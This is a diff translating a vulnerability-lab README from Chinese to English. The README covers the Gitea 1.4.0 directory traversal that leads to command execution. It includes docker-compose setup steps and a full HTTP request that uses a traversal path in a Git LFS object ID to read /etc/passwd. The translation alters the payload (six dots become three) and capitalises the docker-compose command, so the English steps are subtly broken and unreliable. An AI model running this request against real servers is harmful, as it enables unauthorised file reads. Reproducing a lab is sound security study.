@@ -1,33 +1,33 @@
-# Gitea 1.4.0 目录穿越导致命令执行漏洞
+# Gitea 1.4.0 Directory Traversal Causes Command Execution Vulnerability
 
-Gitea是从gogs衍生出的一个开源项目，是一个类似于Github、Gitlab的多用户Git仓库管理平台。其1.4.0版本中有一处逻辑错误，导致未授权用户可以穿越目录，读写任意文件，最终导致执行任意命令。
+Gitea is an open source project derived from gogs. It is a multi-user Git repository management platform similar to Github and Gitlab. There is a logic error in version 1.4.0 that causes unauthorized users to traverse directories, read and write arbitrary files, and eventually cause arbitrary commands to be executed.
 
-参考链接：
+Reference link:
 
 - https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html
 - https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html
 
-## 漏洞环境
+## vulnerability environment
 
-执行如下命令启动启动漏洞环境：
+Run the following command to start the boot vulnerability environment:
 
 ```
-docker-compose up -d
+Docker-compose up -d
 ```
 
-环境启动后，访问`http://you-ip:3000`，将进入安装页面，填写管理员账号密码，并修改网站URL，其他的用默认配置安装即可。（不要修改端口号）
+After the environment starts, visit `http://you-ip:3000`, you will enter the installation page, fill in the administrator account password, and modify the website URL. Others can be installed with the default configuration. (Do not modify the port number)
 
-安装完成后，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：
+Once the installation is complete, create a public repository and add point files as you like (for example, initialize the repository with selected files and templates):
 
 ![](1.png)
 
-然后，需要执行一次`docker-compose restart`重启gitea服务。（原因详见第二个参考链接）
+Then, you need to execute `docker-compose restart` to restart the gitea service. (See the second reference link for details)
 
-## 漏洞复现
+## Vulnerability recurrence
 
-由于漏洞链整体利用比较复杂，我们只复现文件读取部分，剩余利用方法详见第二个参考链接。
+Since the overall utilization of the vulnerability chain is more complicated, we only reproduce the file reading part, and the remaining utilization method is detailed in the second reference link.
 
-打开gitea，找到刚才创建的公开项目，如`vulhub/repo`，发送如下数据包，添加一个Git LFS对象：
+Open gitea, find the public project you just created, such as `vulhub/repo`, send the following packet, add a Git LFS object:
 
 ```
 POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
@@ -41,7 +41,7 @@ Content-Type: application/json
 Content-Length: 151
 
 {
-    "Oid": "....../../../etc/passwd",
+    "Oid": ".../../../etc/passwd",
     "Size": 1000000,
     "User" : "a",
     "Password" : "a",
@@ -50,6 +50,6 @@ Content-Length: 151
 }
 ```
 
-然后，访问`http://your-ip:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth`，即可看到`/etc/passwd`已被成功读取：
+Then, go to `http://your-ip:3000/vulhub/repo.git/info/lfs/objects/...%2F..%2F..%2Fetc%2Fpasswd/sth` See that `/etc/passwd` has been successfully read:
 
 ![](2.png)
